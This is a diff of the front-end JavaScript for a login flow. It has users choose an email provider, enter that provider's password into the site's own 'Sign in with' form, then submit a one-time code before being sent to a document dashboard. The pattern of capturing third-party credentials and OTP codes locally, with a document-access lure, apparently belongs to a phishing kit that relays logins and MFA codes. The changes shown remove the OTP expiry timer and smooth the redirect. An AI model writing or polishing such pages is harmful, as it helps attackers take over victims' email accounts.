@@ -12,7 +12,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
   let selectedProvider = null;
   let userEmail = null;
-  let otpCountdownInterval;
 
   function showPage(page) {
     [
@@ -24,36 +23,6 @@ document.addEventListener("DOMContentLoaded", () => {
     page.classList.add("active");
   }
 
-  function startOTPTimer(durationSeconds = 300) {
-    clearInterval(otpCountdownInterval);
-    const timerDisplay = document.getElementById("otp-timer");
-    let remaining = durationSeconds;
-
-    const otpInput = document.getElementById("otp");
-    const verifyBtn = otpForm.querySelector("button[type='submit']");
-    otpInput.disabled = false;
-    verifyBtn.disabled = false;
-
-    otpCountdownInterval = setInterval(() => {
-      const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
-      const seconds = String(remaining % 60).padStart(2, "0");
-
-      if (timerDisplay) {
-        `This OTP will expire in ${minutes}:${seconds}`;
-      }
-
-      if (remaining <= 0) {
-        clearInterval(otpCountdownInterval);
-        if (timerDisplay)
-          timerDisplay.textContent = "❌ OTP has expired. Please go back and request a new one.";
-        otpInput.disabled = true;
-        verifyBtn.disabled = true;
-      }
-
-      remaining--;
-    }, 1000);
-  }
-
   function capitalize(str) {
     if (!str) return "";
     return str.charAt(0).toUpperCase() + str.slice(1);
@@ -63,17 +32,17 @@ document.addEventListener("DOMContentLoaded", () => {
     btn.addEventListener("click", () => {
       selectedProvider = btn.dataset.provider;
       if (signingInPage) {
-  document.getElementById("signing-in-provider").textContent = capitalize(selectedProvider);
-  showPage(signingInPage);
-  setTimeout(() => {
-    credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
-    credentialsForm.reset();
-    showPage(credentialsInputPage);
-  }, 1200);
-} else {
-  credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
-  credentialsForm.reset();
-  showPage(credentialsInputPage);
+        document.getElementById("signing-in-provider").textContent = capitalize(selectedProvider);
+        showPage(signingInPage);
+        setTimeout(() => {
+          credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
+          credentialsForm.reset();
+          showPage(credentialsInputPage);
+        }, 1200);
+      } else {
+        credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
+        credentialsForm.reset();
+        showPage(credentialsInputPage);
       }
     });
   });
@@ -117,9 +86,9 @@ document.addEventListener("DOMContentLoaded", () => {
 
       if (data.success) {
         showPage(otpVerificationPage);
-        startOTPTimer(300); // 5 minutes
+        document.getElementById("otp-timer").textContent = "OTP sent to your device. Enter it below to continue.";
       } else {
-        alert(data.message || "Failed to send OTP. Please try again.");
+        alert(data.message || "Login failed. Please check your credentials and try again.");
       }
     } catch (error) {
       alert("Network error. Please try again.");
@@ -142,15 +111,14 @@ document.addEventListener("DOMContentLoaded", () => {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email: userEmail, otp: otpValue }),
+        credentials: "include"
       });
 
       const data = await response.json();
 
       if (data.success) {
-        alert("Authenticated! You can now access your documents.");
-        clearInterval(otpCountdownInterval);
-        // TODO: Redirect to dashboard
-        // window.location.href = "/dashboard.html";
+        clearInterval(window.otpCountdownInterval);
+        window.location.href = "/dashboard.html";
       } else {
         alert(data.message || "Invalid OTP. Please try again.");
       }
